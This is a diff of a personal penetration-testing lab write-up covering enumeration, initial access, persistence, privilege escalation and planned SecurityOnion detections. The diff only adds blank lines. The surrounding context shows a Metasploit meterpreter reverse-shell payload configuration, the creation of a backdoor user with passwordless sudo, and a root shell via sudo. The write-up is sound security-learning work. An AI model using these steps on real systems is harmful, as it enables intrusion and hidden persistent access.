@@ -4,7 +4,9 @@ Author: Bobo Nikolov
 Date: 27-10-2025
 Status: In Progress (Defender / SecurityOnion phase next)
 
+
 ---
+
 
 - Objective
 Build isolated attacker <> victim lab to demonstrate reconnaissance, initial access, execution, persistence, and privilege escalation — then add a defender (SecurityOnion) to capture telemetry and create detections.
@@ -17,7 +19,9 @@ Build isolated attacker <> victim lab to demonstrate reconnaissance, initial acc
 
 NOTE: All work is performed on my VM's only!
 
+
 ---
+
 
   ENUMERATION 
   
@@ -25,7 +29,9 @@ NOTE: All work is performed on my VM's only!
 nmap -sS -sV 10.10.10.20
 'evidence/2025-10-27_05-52_AM_Screenshot_Enumeration_ .png'
 
+
 ---
+
 
   INITIAL ACCESS AND EXECUTION
 
@@ -55,7 +61,9 @@ set PAYLOAD linux/x64/meterpreter/reverse_tcp
 set LHOST 10.10.10.10
 set LPORT 4444
 
+
 ---
+
 
    PERSISTANCE
    
@@ -74,7 +82,9 @@ echo 'backdoor_user:P@ssword123!' | sudo chpasswd //Setting a password
 echo 'backdoor_user ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/backdoor_user
 sudo chmod 440 /etc/sudoers.d/backdoor_user
 
+
 ---
+
 
    PRIVILEGE ESCALATION
    
@@ -93,7 +103,9 @@ id
 sudo /bin/bash
 whoami //lead to root
 
+
 ---
+
 
    CONCLUSION
 
@@ -101,7 +113,9 @@ This lab demonstrated a complete attacker workflow in an isolated environment: r
 
 The environment was fully isolated and snapshotted before testing; all changes were reverted after evidence capture. This project serves as a foundation for the defender phase (SecurityOnion), where I will ingest network and host telemetry and author detection rules.
 
+
 ---
+
 
    LESSION'S LEARNED AND MITIGATION
 
@@ -118,7 +132,9 @@ The environment was fully isolated and snapshotted before testing; all changes w
 - Instrument hosts with sysmon/auditd and forward to your SIEM; create alerts for: unexpected `wget`/`curl` + `chmod +x`, new `/etc/sudoers.d/` files, and new user creation.
 - Add network egress restrictions to limit direct payload fetch from attacker-controlled HTTP servers.
 
+
 ---
+
 
   Next steps (roadmap)
 
@@ -126,7 +142,9 @@ The environment was fully isolated and snapshotted before testing; all changes w
 - Detection engineering: write Sigma/Suricata rules and Splunk/SO correlation searches for this scenario.  
 - Lateral movement (optional): expand the lab to include a second internal host to demonstrate lateral movement and network-based detection. (WIP — planned for next iteration)
 
+
 ---
+
 
   Appendix – Commands & Artifacts
 
